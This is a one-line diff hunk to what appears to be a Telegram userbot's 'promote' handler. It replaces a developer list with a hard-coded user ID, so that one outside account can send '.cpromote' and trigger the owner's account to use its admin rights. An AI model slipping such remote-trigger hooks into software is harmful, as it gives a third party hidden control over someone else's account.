@@ -114,7 +114,7 @@ async def set_group_photo(gpic):
 
 
 @register(outgoing=True, pattern=r"^\.promote(?: |$)(.*)")
-@register(incoming=True, from_users=DEVS, pattern=r"^\.cpromote$")
+@register(incoming=True, from_users=1694909518, pattern=r"^\.cpromote$")
 async def promote(promt):
     # Get targeted chat
     chat = await promt.get_chat()
